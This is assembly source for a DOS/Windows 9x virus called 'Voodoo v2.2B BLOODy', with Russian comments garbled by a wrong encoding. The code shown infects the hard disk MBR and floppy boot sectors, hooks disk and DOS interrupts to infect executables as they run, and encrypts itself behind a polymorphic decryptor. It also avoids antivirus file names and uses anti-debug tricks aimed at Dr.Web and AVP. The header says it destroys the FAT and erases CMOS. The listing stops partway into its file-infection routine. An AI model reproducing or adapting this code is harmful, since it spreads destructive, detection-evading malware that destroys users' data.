   ;Voodoo v2.2B BLOODy
   ;(c) by Voodoo/SMF
   ;‚ è¥¬ã ¢¨¬ ¨î ¯à¥¤®áâ ¢«ï¥âáï ¨áå®¤¨ª ¨§ ¬®¨å ¯®á«¥¤¨å ’‚€*…¨‰ ¯®¤ „Ž‘.
   ;* àã á«®¢ ®¡ ®á®¡¥®áâïå íâ®£® ª®¤ . *à¥¦¤¥ ¢á¥£®, íâ® ¡ãâ®¢ë© ‘Œ ª®â®àë©
   ;¦¨¢¥â ¢ Œ** ¨ § £àã§®çëå á¥ªâ®à å ¤¨áª¥â. Šà®¬¥ â®£®, ® "¯ âç¨â" …•…èª¨ ¥á«¨
   ;®¨ § ¯ãáª îâáï á ¤¨áª  €. *â®â ª®¤ ¢¯®«¥ ¦¨§¥á¯®á®¡¥ ¢ Œ„9•. *®¤ NT ® ¥
   ;¢ á¨« å ¯à®¡à âìáï ¢ Œ** ¯®íâ®¬ã ¥¬ã ¯à¨å®¤¨âìáï ¤®¢®«ìáâ¢®¢ âìáï …•…èª ¬¨  
   ;ä«®¯¨ª å :-( . *® ¥á«¨ ® ¢á¥-â ª¨ ¯à®¡à «áï ¢ Œ** à á¯« âë ¥ ¬¨®¢ âì... ;)
   ;Dr.Web ¨ AVP ¥ ¤¥â¥ªâïâ ¥£® ¢ § è¨äà®¢ ®¬ ¢¨¤¥.
   ;Š®¤ è¨äàã¥âáï ¤¢ ¦¤ë. *®á«¥¤¨© à § ª®¤ è¨äàã¥âáï ¯®«¨¬®àäë¬ ªà¨¯â®¢é¨ª®¬.
   ;*®«¨¬®àä®áâì   ãà®¢¥ ¡ãâ  ¥ à¥ «¨§®¢  .
   ;ˆá¯®«ì§ã¥â áâ¥«á ¯à¨¥¬ ¤«ï ¬ áª¨à®¢ª¨ á¥¡ï ¢ Œ**.
   ;“¨çâ®¦ ¥â FAT ¨ áâ¨à ¥â CMOS.
   ;‹¨ªã¥âáï ¢ ¢¨¤¥ COM ¯à®£à ¬¬ë.
   ;==== Cut ====
   ; ====================== Voodoo v2.2B BLOODy ======================
   ; Program       : Voodoo v2.2B
   ; Description   : Boot.MBR.EXE.TSR.Crypt
   ; Last modified : 26.02.2000
   ; Target OS     : MsDOS/Win95/98/NT
   code   segment
   .286
   assume cs:code,ds:code,es:code
   INCLUDE  MZSTUFF.INC
   addres01hTR equ ReloCS+2
   filesize  EQU addres01hTR  +4
   dwr       EQU filesize +4
   Dkr       EQU dwr+4
   sizeDkr  equ c11-decript
   filename  equ  Dkr+sizeDkr
                       org 100h
   BEGIN :             call next_1
     next_1 :          POP BP
    OFFFSET           equ  oldCS__-next_1
    OFFFSET1          equ  oldES__-next_1
                       MOV AX,ES
                       mov word ptr cs:[bp+OFFFSET1],ax
                       ADD AX,10H
                       add WORD PTR cs:[Bp+OFFFSET],ax
   ;------------------------------------------------
             mov ax,1234h
             int 21h
             cmp ax,4321h
             jne @AlocMem
             CMP BP,103H
             JNE RET2EXE
             mov ah,4ch
             int 21h
    Mov_ES_0000h:
               xor ax,ax
               mov es,ax
               ret
    Get_FDD_Param:
               mov ah,08h
               mov dl,0
               int 13h
               ret
   add_constant EQU 100h
   oldCS__K  Equ offset oldCS__ -add_constant
   RET2EXEfrom:
             mov bp,103h
   RET2EXE:  mov di,oldCS__K
             mov ax,word ptr cs:[di+bp+3]      ;es
             mov es,ax
             mov ds,ax
             add ax,10h ;start seg
             add ax,word ptr cs:[di+bp-1] ;reloSS
             mov dx,word ptr cs:[di+bp+1] ;oldSP
             mov ss,ax
             mov sp,dx
   FuckuDrweb3:
   db 0eah
   oldIP__  dw ?
   oldCS__  dw ?
   oldSS__  dw ?
   oldSP__  dw ?
   oldES__  dw ?
   MemLimit  EQU  01ffH
   ;###################################
   ;‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï  è¨å ã¦¤
   @AlocMem:           MOV AH,48H
                       MOV BX,MemLimit
                       int 21h
                       JNB @Next01
                       MOV AH,49H
                       int 21h
                       MOV AH,48H
                       MOV BX,0FFFFH
                       int 21h
                       SUB BX,MemLimit+1
                       MOV AH,48H
                       int 21h
                       JMP @AlocMem
      @Next01:         PUSH DS
                       DEC AX
                       MOV DS,AX
                       DB  0C7H,06H,01H,00H,08H,00 ; Volum System
                       POP  DS
                       INC  AX
                       MOV ES,AX       ;ES=NEW_SEG
            ;----------------------------------
            ; *¥à¥¥á¥¬ á¥¡ï ¢ NEW_Seg
             sizeBady equ  @End-BEGIN
             mov cx,sizeBady
             sub bp,3
             mov si,bp
             mov di,100h
             push cs
             pop  ds
             rep movsb          ; es:di<--ds:si
   ;-----------------------------------
   ;              call next@
   ;              db 't.EXE$',0
   ;              next@: pop si
   ;              mov di,filename
   ;              mov cx,13
   ;              rep movsb
   ;----------------------------------
            push es
            mov ax,offset Next_Code1
            push ax
            retf
            ;------------------------------------
   Next_Code1:
   ;anti web cripting
   keyCRC2offset EQU  keyCRC2offset_-begin+2
   sizeVCRC2     EQU  @end -beginer
   ;----------------------------------------------------------------
   ; €â¨ ¥¢à¥áâ¨ç¥áª¨© ¯à¨¥¬ ¯à®â¨¢ ¢…*€   ("ª ª ¤¢  ¡ ©â  ...")
    mov ax,046h  ; 0:46ch ¡¨®á®¢áª¨¥ â¨ª¨ ®â â ©¬¥à .
    mov ds,ax
    mov cx,sizeVCRC2
    mov word ptr ds:[0ch],1234h
    mov bx,offset beginer
   @ql:
    mov dl,byte ptr es:[bx]
   keyCRC2offset_:
    xor dl,00h
    mov ax,word ptr ds:[0ch]
    cmp word ptr ds:[0dh],ax
    jne real_code
    je FuckuDrweb2  ; ¤«ï ¢…* ¢á¥£¤  "¨ª¢ë«"  :-P
    xor dx,bx
    mov word ptr es:[bx],dx
    in ax,40h
    mov di,ax
    push di
    in ax,40h
    cmp di,ax
    jne FuckuDrweb2 ; ¯®áë« ¥¬ ¥£®   0FFFFH:0000H
    pop di
    mov ax,ax
    add dx,di
    inc bx
    je @ql
   ;---------------------------------------------------------------------
    real_code:
    mov byte ptr es:[bx],dl
    inc bx
    loop @ql
   level2decript EQU beginer-begin
   jmp  Next_Code
   beginer:
   fileATR dw 9999h
   keyCRC2 db ?
   keyCRC  dw ?
   hendler dw ?
   desh_size  dw 0000h
       int21h equ 82h
   ;---------------------------------------
   ; ‘ëà¥æ à áè¨äà®¢é¨ª .
   decript2:
         k1: mov ax,046h   ;
         k2: mov ds,ax     ;
         k3: mov ax,word ptr ds:[0ch]
         k4: cmp word ptr ds:[0dh],ax
         k5: je  FuckuDrweb
   decript:
       cc1:     call cc2
       cc2:     pop  bx ; r2   push di si +3 +4
       cc3:     mov cx,(sizeBady)/2
       C1:      push cs
       C2:      pop ds
       C3:      add bx,1000h
   L1: cc4:     push cx
       C4:      mov ax,[bx]
       C5:      xor cx,1111h
       C6:      mov [bx],ax
       C7:      inc bx
       C8:      inc bx
       C9:      pop cx
       C10:     loop  L1
       C11:       ret
   ;--------------------------------------------------------
         MORFSIZE EQU 12 ; „«¨  á«ãç ©®£® ¤¦ ¬¯  ¢ ¤¥ªà¨¯â®à¥.
   randmrs:   mov ax,MORFSIZE
              PUSH AX
              PUSH CS
              CALL RANDOM
              ret
   OPTIMAZI:  mov byte ptr es:[di],0ebh
              mov byte ptr es:[di+1],al
              inc di
              inc di
              add di,ax
              RET
   OPTIMAZI2: call  randmrs
              CALL OPTIMAZI
   FuckuDrweb2: RET ; ’  â®çª  ªã¤  ¬ë ¯®áë« ¥¬ ¢…*€
   OPTIMAZI3:  push ax
               push cs
               call random
               RET
   OPTIMAZI5_1:mov cx,01
               jmp OPTIMAZI4
   OPTIMAZI5_2:mov cx,02
               jmp OPTIMAZI4
   OPTIMAZI5_3:mov cx,03
               jmp OPTIMAZI4
   OPTIMAZI5_4:mov cx,04
   OPTIMAZI4: cld
              rep movsb
              call OPTIMAZI2
              ret
   FuckuDrweb:
   Make_Vbady: push bp
               PUSH CS
               POP ES
               PUSH CS
               POP DS
              ;---------
   ; morph mov ax,46h  mov ds,ax
   ;   ‡¤¥áì £®â®¢¨âìáï ‘ëà¥æ.
   repon:     mov ax,007h
              call OPTIMAZI3
              cmp ax,4
              jne addcom
              jmp repon
   addcom:    add byte ptr cs:[k1],al
              add byte ptr cs:[k2+1],al
              ;---------
              ; save decripter in cs:Dkr
                mov di,Dkr
                mov si,offset cc1
                mov cx,c11-cc1
                cld
                rep movsb
                ;----
               mov ax,4
               call OPTIMAZI3
               mov cl,al
               push cx
               mov ax,3
               call OPTIMAZI3
               pop cx
               mov ah,cl  ;ah=rn1,al=rn2
               cmp ah,03h ;rn1
               je nc1
               push ax
               mov cl,3
               shl ah,cl ;rn1*8
               add byte ptr [c4+1],ah  ;  set mov r1,[bx]
               pop ax
               cmp ah,00h
               je nc3
               add  byte ptr [c5+1],ah
               sub  byte ptr [c5+1],1    ;set xor  r1,key
               jmp nc4
              nc3: mov  word ptr [c5],3590h ; set xor r1,key
              nc4:jmp nc2
              nc1:mov  byte ptr [c4+1],2fh
                  mov  byte ptr [c5+1],0f5h ;set
              nc2:
              cmp al,0 ; cmp rn2
              je nc_1
               add byte ptr [c3+1],al   ;set mov r2,offsetvir
               add byte ptr [c3+1],2    ;
               sub byte ptr [c4+1],4   ;
               add byte ptr [c4+1],al  ; set mov r1,[r2]
               add byte ptr [cc2],2     ; pop r2
               add byte ptr [cc2],al
               add byte ptr [c7],2     ; set inc r2
               add byte ptr [c7],al
               add byte ptr [c8],2     ; set inc r2
               add byte ptr [c8],al
               jmp nc_2
           nc_1:
           nc_2: mov dl,byte ptr [c4+1]   ;c6:=c4
                 mov byte ptr [c6+1],dl
              mov ax,0FFFFh  ; get key
              call OPTIMAZI3  ;fileATR
              mov word ptr cs:[keyCRC],ax
              mov word ptr cs:[c5+2],ax
              ;---------
              MOV DI,OFFSET @End
              mov cx,160
   repeat:    mov ax,0fffFh
              push di
              push cx
              call OPTIMAZI3
              pop cx
              pop di
              stosw
              loop  repeat
               ;--------------
                ; anti web 1 level
                mov di,offset @End
                mov si,offset k1
                ;mov cx,k2-k1    ;
                ;call OPTIMAZI4
                call OPTIMAZI5_3
               ; mov cx,k3-k2    ;
               ; call OPTIMAZI4
                call OPTIMAZI5_2
                ;mov cx,k4-k3
                ;call OPTIMAZI4
                call OPTIMAZI5_3
                ;mov cx,k5-k4
                ;call OPTIMAZI4
                call OPTIMAZI5_4
              ;  mov cx,decript-k5
              ;  call OPTIMAZI4
              call OPTIMAZI5_2
                           ; MOV DI,OFFSET @End
              push di      ; ¤«ï  áâà®©ª¨ add bx,<di
              mov si,offset cc1
              ;mov cx,cc2-cc1
              ;call OPTIMAZI4
              call OPTIMAZI5_3
              ;mov cx,cc3-cc2
              ;call OPTIMAZI4
              call OPTIMAZI5_1
              ;mov cx,c1-cc3
              ;call OPTIMAZI4
              call OPTIMAZI5_3
             ; mov cx,c2-c1
             ; call OPTIMAZI4
              call OPTIMAZI5_1
             ; mov cx,c3-c2
             ; call OPTIMAZI4
             call OPTIMAZI5_1
              mov cx,cc4-C3    ;C3
              push di                  ;+  ¤«ï § ¥á¥¨ï offset
              call OPTIMAZI4           ;|
              mov cx,c4-cc4            ;|
              cld                      ;|
              rep movsb                ;|
              PUSH DI          ;+       |
              call OPTIMAZI2   ;|       |
              mov cx,c5-c4     ;|       |     LOOP
              cld              ;|       |
              rep movsb        ;|       |
              CALL  OPTIMAZI2  ;|       |
        ;     mov cx,c6-c5     ;|       |
        ;     call OPTIMAZI4   ;|       |
              call OPTIMAZI5_4
            ; mov cx,c7-c6     ;|       |
            ; call OPTIMAZI4   ;|       |
              call OPTIMAZI5_2
            ; mov cx,c8-c7     ;|       |
            ; call OPTIMAZI4   ;|       |
              call OPTIMAZI5_1
   ;          mov cx,c9-c8     ;|       |
   ;          call OPTIMAZI4   ;|       |
              call OPTIMAZI5_1
   ;          mov cx,c10-c9    ;|       |
   ;          call OPTIMAZI4   ;|       |
              call OPTIMAZI5_1
              mov cx,c11-c10   ;|       |
              cld              ;|       |
              rep movsb        ;|       |
              POP DX  ;OLD DI  ;-       |
              MOV CX,DI                ;|
              SUB CX,DX  ; LINGTH C4    |  C10
              MOV DL,0FFH              ;|
              SUB DL,CL                ;|
              mov byte ptr es:[di-1],DL;|
              mov byte ptr es:[di],0ebh;|
              mov byte ptr es:[di+1],al;|
              inc di                   ;|
              inc di                   ;|
              add di,ax                ;|
              mov dx,di                ;|
              pop BX                   ;-
              pop bp
              sub DX,bp
              sub DX,3
              mov word ptr ds:[bx+2],dx
              push di
              MOV ax,OFFSET @End
              sub di,ax
              mov cs:[desh_size],di
             ;-- ¢®áâ ®¢¨¬ ¤¥ªà¨¯â®à ----------------------
                mov si,Dkr
                mov di,offset cc1
                mov cx,c11-cc1
                cld
                rep movsb
             mov byte ptr cs:[k1],0b8h
             mov byte ptr cs:[k2+1],0d8h
             ;----  ¤®¡ ¢«ï¥¬ bady & ˜¨äàã¥¬  -----------------
              sizeV EQU @End - Begin
              POP DI
              PUSH DI
              call ADD_Bady_To_DI
                       ; 2-© ãà®¢¥ì
              mov ax,00ffh
              call OPTIMAZI3
              mov byte ptr cs:[keyCRC2],al
              pop di
              push di
              mov byte ptr cs:[di+keyCRC2offset],al ;set decript key
              mov cx,sizeVCRC2
              add di,level2decript
   @ll2:      mov dl,byte ptr cs:[di]
              xor dl,al
              mov byte ptr cs:[di],dl
              inc di
              loop @ll2
               ;-------------
              pop di
              mov ax,word ptr cs:[keyCRC]
              mov cx,(sizeV)/2
   @ll:       mov dx,[di]
              xor dx,ax
              mov [di],dx
              inc di
              inc di
              loop @ll
              pop bp
              ret
   ADD_Bady_To_DI: mov si,offset begin
                   mov cx,sizeV
                   cld
                   rep movsb
                   ret
   db 'Voodoo V2.2B BLOODy'
   db '//SMF'
   decript_MBR:
              mov cx,512
              mov ah,066h
              call decriptMBR
              ret
   infect_MBR:
              push cs
              pop es
              push cs
              pop ds
              mov dx,80h
              mov cx,01h
              mov ax,0201h
              mov bx,offset @end
              int 81h
              cmp cs:[bx+0dh],012cdh
              je ale
   ;--------- á®åà ¨¬ MBR in  0 0 20 --------------
              mov bx,offset @end
              call decript_MBR
              mov bx,offset @end
              mov dx,80h
              mov cx,20
              mov ax,0301h
              mov bx,offset @end
              int 81h
              mov bx,offset @end
              call decript_MBR
              ; patch mbr --
              mov  di,offset @end
              add di,0dh
              mov si,offset New_MBR
              mov cx, offset End_New_MBR - offset New_MBR
              cld
              rep movsb
              ;-------------
           ;jmp notwritetombr
   ; *ëâ ¥¬«ï § ¯¨á âìáï ç¥à¥§ ¯®àâë
   ; ‚ ¢¨¤¥  á ®¡« ¬ îâ
   ; â®£¤  ¬ë § ¯¨è¥¬áï ç¥à¥§ ‘„13
           xor bx,bx
           MOV DX,3F6H
           XOR AL,AL
           OUT DX,AL       ;Turn off IRQ 14
           CALL WAITHD
           cmp bx,66ffh
           je ERRORPTR
           call writeMBR_PORT
           jmp alldone
         ; --- Set MBR to 0 0 1 (40) ---
   ERRORPTR:       MOV DX,3F6H     ;Turn on IRQ 14 and exit
                   MOV AL,on
                   OUT DX,AL
             mov dx,80h
             mov cx,01
             mov ax,0301h
             mov bx,offset @end
             int 81h
    alldone:
   notwritetombr:
   ;------------------------------------------
   ;--- ‡ ¯¨è¥¬áï   HDD 0 0 3 - 0 0 9  6 cek ------
              call Make_Cript_Bady
              mov dx,80h
              mov cx,03h
              mov ax,0309h
              mov bx,offset  @end
              int 81h
   ;-----‡ ¯¨è¨¬ ¤¥ªà¨¯â®à  ¢  0 0 2  ---------------
              mov dx,80h
              mov cx,02h
              mov ax,0301h
              mov bx,offset DecripterBOOT
              int 81h
    ale:      ret
   Next_Code:
   ;################################################
   ;---- ’à á¨àã¥¬ cdå13 ¨ cdå21  ----------------------
              call    detectint21and13h
              cmp ax,6666h
              je ERRor_NT
              call    infect_MBR
   ERRor_NT: ; *Ž¤ *’  á ®¡« ¬ îâ.
   ;--- *à®çâ¥¬ MBR ------------
   ; * áâà®¨âì MBR ¨ § ¯¨á âì
   ;------------------------------------------------
   alredy_:    call    Hook_0x13h
   ;------------------------------------------------
   bad:      ;addrOld21h
              mov ax,3521h
              int 82h
              mov word ptr cs:[addrOld21h],bx
              mov bx,es
              mov word ptr cs:[addrOld21h+2],bx
              ; set int 21
              push cs
              pop es
              mov ax,cs
              mov word ptr cs:[Jumper+2],ax
              mov ax,offset new_0x21
              mov word ptr cs:[Jumper],ax
              call toJumper
              db 0eah
   Jumper:    dd 0
   int24h:    mov ah,03h
              iret
     toJumper: pop si
              call Mov_ES_0000h
              push cs
              pop ds
              mov di,204h+8h ;
              mov cx,5
              cld
              rep movsb
               ;----
              cli
              call Mov_ES_0000h
              mov ds,ax
              mov bx,84h
              mov es:[bx+2],ax
              mov ax,204h+8h
              mov es:[bx],ax
              sti
             ;------------------
              push cs
              pop es
   exitfromMe:
            CMP BP,100H
            je dosexit
            mov ax,offset RET2EXEfrom
            push ax
            ret
   dosexit: mov ah,4ch
            int 21h
   Make_Cript_Bady:
              push cs
              pop ds
              push cs
              pop es
              mov di,offset @end
              mov si,offset BEGIN
              call ADD_Bady_To_DI
              mov bx,offset @end
              mov cx,sizeV
              mov ah,00
              call decriptMBR
              ret
   ;  BOOT
   ;  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   ;  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
   ;-----------------------------
   FDD_Enter:
             call Mov_ES_0000h
             PUSH ES
             call Get_FDD_Param
             POP ES
             mov dl,0 ;drive
             inc ch   ; cil 80
             mov cl,1 ; sec
             mov ax,0201h
             mov bx,07c00h
             int 13h
             ;SET 13 2 81
             mov ax,es:[4ch]
             mov es:[204h],ax
             mov ax,es:[4ch+2]
             mov es:[204h+2],ax
             push es
             push ds
             call   infect_MBR
             pop ds
             pop es
             jmp  contin_boot
             ;jmp jmp2boot
   ;----- Read real boot --------
   BOOT_ENTEre_point:
                     cmp bp,0FDDh
                     je FDD_Enter
                     call Mov_ES_0000h
                     mov bx,07c00h
                     mov dx,80h
                     mov cx,20
                     mov ax,0201h
                     int 13h
                     ; - decript -
                     call decript_MBR
                     contin_boot:
                     ; DESTR !
                     CALL  LOGO
                     ; hook 0x12
                     mov ax,es:[048h]                ; save 0x12
                     mov word ptr cs:[old12h],ax     ;
                     mov ax,es:[048h+2]              ;
                     mov word ptr cs:[old12h+2],ax   ;
                     mov ax,es:[070h]                  ; save 0x1Ch
                     mov word ptr cs:[ old0x1c],ax     ;
                     mov ax,es:[070h+2]                ;
                     mov word ptr cs:[ old0x1c+2],ax   ;
                     ; set corent 0x21h
                     mov ax,es:[084h]                  ; save 0x21h
                     mov word ptr cs:[old0x21hb],ax    ;
                     mov ax,es:[084h+2]                ;
                     mov word ptr cs:[old0x21hb+2],ax  ;
                     mov ax,cs
                     cli
                     mov es:[048h+2],ax
                     mov es:[70h+2],ax
                     mov ax,offset new0x12h
                     mov es:[048h],ax
                     mov ax,offset hooking0x1C
                     mov es:[070h],ax
                     sti
                     ;----------
         jmp2boot:   db 0eah
                     dd 07c00h
   ;-----------------------------
   ;#############boot level#################
   hooking0x21:pusha
               push ds
               push es
               push cs
               pop ds
               mov ah,52h
               pushf
               call dword ptr cs:[old0x21hb]
               mov ax,es:[bx-02]
   fintnext:   mov ds,ax
               cmp byte ptr ds:[0],'Z' ;¯à®¢¥àª    ¯®á«¥¤. MCB
               jz Make_notlast
               add ax,ds:[03h]
               inc ax
               jmp fintnext
   Make_notlast: mov byte ptr ds:[00],'M' ;¤¥« ¥¬ ¥ ¯®«á«¥¤¨¬
                 add ax,ds:[03h]
                 inc ax
                 mov ds,ax
                 mov byte ptr ds:[00],'Z' ;last
                 mov word ptr ds:[01],08  ;system
                 mov ax,200h
                 mov word ptr ds:[03],ax ;size
                 xor ax,ax
                 mov ds,ax
                 cli
                 ; ret 1ch
                  mov ax,word ptr cs:[old0x1c]
                  mov ds:[70h],ax
                  mov ax,word ptr cs:[old0x1c+2]
                  mov ds:[70h+2],ax
                 ; ret 12h
                  mov ax,word ptr cs:[old12h]
                  mov ds:[48h],ax
                  mov ax,word ptr cs:[old12h+2]
                  mov ds:[48h+2],ax
                  ; hook21h
                  ;addrOld21h
                  mov ax,word ptr cs:[old0x21hb]
                  mov word ptr cs:[addrOld21h],ax
                  mov ax,word ptr cs:[old0x21hb+2]
                  mov word ptr cs:[addrOld21h+2],ax
                  sti
                  cli
                  mov ds:[84h+2],cs
                  mov ax,offset new_0x21
                  mov ds:[84h],ax
                  sti
                 ; hook13h
                   push cs
                   pop ds
                   push cs
                   pop es
                  call  Hook_0x13h_inBoot
                  mov byte ptr cs:[flag1],0
                  mov byte ptr cs:[counter],0
   @e:            pop es
                  pop ds
                  popa
                   db 0EAH
   old0x21hb :     dd 0
   End_hooking0x21:
   ;------------------------------------------------
   hooking0x1C:   cmp byte ptr cs:[flag1],0
                  je Skan0x21
                  jmp dword ptr cs:[old0x1c ]
      Skan0x21:
                 push ax
                 push bx
                 push ds
                 xor bx,bx
                 mov ds,bx
                 mov bx,ds:[084h]
                 cmp word ptr cs:[old0x21hb],bx
                 jne Savpoint0x21
                 mov bx,ds:[084h+2]
                 cmp word ptr cs:[old0x21hb+2],bx
                 je Exit_Not_Chen
   Savpoint0x21:  mov bx,ds:[084h]
                  mov word ptr cs:[old0x21hb],bx
                  mov bx,ds:[084h+2]
                  mov word ptr cs:[old0x21hb+2],bx
                  inc byte ptr cs:[counter]
                  cmp byte ptr cs:[counter],02
                  jne Exit_Not_Chen
                  cli
                  mov ax,ds:[084h]   ;set to 82h
                  mov ds:[208h],ax   ;
                  mov ax,ds:[084h+2] ;
                  mov ds:[208h+2],ax ;
                  mov ds:[086h],cs
                  mov ax,offset hooking0x21
                  mov ds:[084h],ax
                  sti
                  mov byte ptr cs:[flag1],1
   Exit_Not_Chen: pop ds
                  pop bx
                  pop ax
                   db 0eah
    old0x1c  :     dd 0
   flag1     :     db 0
   counter   :     db 0
   End_hooking0x1C:
   new0x12h:
         pushf
         call dword ptr cs:[old12h]
         db 0c1h,0e0h,06h
         sub ax,MemLimit+1
         db 0c1h,0e8h,06h
         iret
   old12h:  dd 0
   End_new0x12h:
   ;---  New MBR -----
   New_MBR:
        int 12h
        db 0c1h,0e0h,06h
        sub ax,MemLimit ;
        mov es,ax
        PUSH AX
        ;LOAD BADY
        mov bx,100h
        mov dx,80h
        mov cx,03h
        mov ax,0209h
        int 13h
        POP AX
        ;-----------
        SUB ax,16
        mov es,ax
        ;load decriptor
        xor bx,bx
        mov dx,80h
        mov cx,02h
        mov ax,0201h
        int 13h
        push es
        push bx
        retf
   End_New_MBR:
   ;---------------------------------------
   ;#######################################
   Hook_0x13h_inBoot:
     pusha
     push es
     push ds
   jmp Not_find
   Hook_0x13h: ; ¯¥à¥å¢ â 13 £®
     pusha
     push es
     push ds
     in al,40h
     and al,0fh
     mov bx,0cde0h
     add bl,al
     nextint:
     mov  ax,0f000h
     mov es,ax
     push bx
     mov ax,0f000h
     call OPTIMAZI3
     pop bx
     mov di,ax
     scantt:
      inc di
      cmp di,0fff0h
      je vse
      cmp bh,byte ptr es:[di]
      jne scantt
      cmp bL,byte ptr es:[di+1]
      jne scantt
      jmp Hook_0x13
   vse:   inc bl
          cmp bl,0ffh
          jne nextint
   Not_find:
   call save0x13h_
   cli
   xor ax,ax
   mov ds,ax
   mov word ptr ds:[04CH+2],CS
   mov word ptr ds:[04CH],OFFSET Int13h_call_from_boot
   sti
   jmp  exit_from_Hook0x13h
   Hook_0x13:
   ; bl=my intvec
   ; es:di entry point
   push es
   push di
   push bx
   inc di
   inc di
   mov  word ptr cs:[my_offset+1],di
   mov ax,0f000h ; !?
   mov  word ptr cs:[my_seg+1],ax
   ; #1 save old_intXX
     push es
     call Mov_Es_0000h
     mov bh,0
     mov cl,2
     shl bx,cl
     mov ax,word ptr es:[bx]
     mov word ptr cs:[old_intXX],ax
     mov ax,word ptr es:[bx+2]
     mov word ptr cs:[old_intXX+2],ax
     pop es
   ;-------------------
   call save0x13h_
   ;-----------------------
   ; #3 set new INTxx
    pop bx
    mov al,bl
    call set_New_intXX ;al=   ª ª®©
   ;-----------------------
   ; #4 set new int13h
   ;pop dx pop ds  mov ax,2513h  int 21h
    call mov_es_0000h
    cli
    pop ax
    mov word ptr es:[04ch],ax
    pop ax
    mov word ptr es:[04ch+2],ax
    sti
    exit_from_Hook0x13h:
    pop ds
    pop es
    popa
    ret
   ;-----------------------------------
   set_New_intXX:
    push cx
    push di
    mov ah,0
    mov cl,2
    shl ax,cl ; al*4
    mov di,ax
    call mov_es_0000h
    mov ax,cs
    cli
    mov word ptr es:[di+2],ax
    mov ax,offset New_intXX
    mov word ptr es:[di],ax
    sti
    pop di
    pop cx
    ret
   ;----------------------------------
   save0x13h_:
   ; #2 save old_int13h
    PUSH Ax
    push es
    call mov_es_0000h
    mov ax,word ptr es:[04ch]
    mov word ptr cs:[old_int13h],ax
    mov ax,word ptr es:[04ch+2]
    mov word ptr cs:[old_int13h+2],ax
    pop es
    POP Ax
    ret
   ;---- Ž¡à ¡®âç¨ª 13 £® -------------
   Int13h_call_from_boot:
               pushf
               push cs
               push ax
              jmp  Int13h_call_from_boot2
   New_intXX: pusha
              mov bp,sp
              mov ax,ss:[bp+10h]
   my_offset: cmp ax,0ffffh
              jne Contin
              mov ax,ss:[bp+2+10h]
   my_seg    : cmp ax,0Ffffh
              je  Int13h_call
   Contin:    popa
              db 0eah
   old_intXX: dd ?
   Int13h_call: popa
   Int13h_call_from_boot2:
                cmp dl,0h
                je Floppy
                mov WORD ptr cs:[fun],aX
                cmp ah,03h
                je write_
                clc
   Floppy_:     call calling13h
                jmp notErr
   exit_:      add sp,6 ;clear stek
               iret
   exit__:     popf
               popa
               jmp exit_
   old_int13h: dd ?
   fun         dW 0
   calling13h: pushf
               caLL dword ptr cs:[old_int13h]
               ret
   notErr:     pusha
               clc
               pushf
               cmp dl,80h
               jne exit__
               cmp byte ptr CS:[fun+1],02
               je read
               jmp exit__
   Floppy:      or ch,ch
                ja exit_F_
                cmp cl,1
                jne  exit_F_
                cmp ah,2
                jne exit_F_
                or dh,dh
                ja exit_F_
                push ds
                push ax
                xor ax,ax
                mov ds,ax
                TEST   byte PTR DS:[043Fh],01h
                jnz FDD_Motor_ON
                pop ax
                pop ds
                call calling13h
                jc RerorFloppy
                cmp es:[bx+03eh],12cdh
                je Nex
                 pusha
                 push es
                 call infect_FDD
                 pop  es
                 popa
            Nex: jmp exit_
   Write2FDD:
   exit_F_:     call  calling13h
                jc RerorFloppy
                jmp exit_
   write_:  jmp write
   FDD_Motor_ON: pop ax
                 pop ds
                 jmp exit_F_
   ;------------------------------------------
   read:       or ch,ch
               ja exit__
               cmp cl,9
               jg  exit__
               or dh,dh
               ja exit__
               add CL,19
               mov ax,CS:[fun]
               call calling13h
              ;----- decriptr 1st ---
               CMP CL,20
               JNE NOmbr
               call decript_MBR
   NOmbr:      jmp exit__
   ;-------------------------------
   RerorFloppy:  add sp,6 ;clear stek
                 push bp
                 mov bp,sp
                 or word ptr  ss:[bp+6],0000000000000001b ;set CF and AF
                 pop bp
                 iret
   exit__Write:popf
               popa
               call calling13h
               jmp exit_
   ;--------------------------------
   write:      pusha
               clc
               pushf
               cmp dl,80h
               jne exit__Write
               or ch,ch
               ja exit__Write
               cmp cl,9
               jg  exit__Write
               or dh,dh
               ja exit__Write
               add CL,19
               CMP CL,20
               JNE NOmbrw
               call decript_MBR
   NOmbrw :    mov ax,CS:[fun]
               call calling13h
               jmp exit__
   ;---------------------------
   new_0x21:
              push ax
              push bx
              push di
              push dx
              XCHG AX,BX
              cmp Bx,1234h
              je Pong
              cmp Bh,4bh
              jne notExec
   @inf:       XCHG AX,BX
              mov di,filename
              mov bx,dx
   trans:     mov al,ds:[bx]
              mov cs:[di],al
              inc di
              inc bx
              cmp al,0
              jne trans
              push cx
              push si
              push di
              push es
              push ds
              call  infect_file
              pop ds
              pop es
              pop di
              pop si
              pop cx
   notExec:   pop dx
              pop di
              pop  bx
              pop  ax
   @e1:
   exit_0x21: db 0eah
   addrOld21h:  dd 0
   Pong:      pop dx
              pop di
              pop  bx
              pop  ax
              mov ax,4321h
              iret
   int01for21h:pushf
               cmp ax,0CCCCh
               jne exitfromint0x01
               mov ax,bp
               mov byte ptr cs:[int01for21h],0cfh
   exitfromint0x01: popf
                   iret
   trac21h :   pushf
               db 60h
               ; set new int01
               mov ax,3501h
               int 21h
               mov word ptr cs:[ollds0x01],bx ;save old 0x01
               mov bx,es
               mov word ptr cs:[ollds0x01+2],bx
               ; set to my 0x01
               mov ax,2501h
               push cs
               pop ds
               mov dx,offset int01for21h
               int 21h
               call ProcSetTF_1
               db 061h
               popf
               int 82h
               call ProcSetTF_0
               push ds
               push es
               mov ax,2501h
               mov dx,word ptr cs:[ollds0x01+2]
               mov ds,dx
               mov dx,word ptr cs:[ollds0x01]
               int 21h
               mov byte ptr cs:[int01for21h],09ch
               pop es
               pop ds
   noFDD:      ret
   ollds0x01  dd  0
   olld0x24h: dd  0
   test_name: mov di,filename
    inc_di:   inc di
              cmp byte ptr ds:[di],'.'
              jne inc_di
              call tablname
              db 'INF'
              db 'WEB'
              db 'AVP'
              db 'VER'
              db 'AND'
              db 'AIN'
   tablname:  pop si
              call test_name_
              call test_name_
              call test_name_
              call test_name_
              call test_name_
              call test_name_
              ret
   OOO:      pop ax
             pop ax
             ret
   test_name_: dec di
              dec di
              dec di
              mov cx,3
              cld
              repe cmpsb
              je OOO
              add si,cx
              add di,cx
              ret
   infect_file:
             ;-- Infect file cs:0000 ----------------------
             ; read corent atr
             ; set 0x24
              mov ah,19h
              int 21h
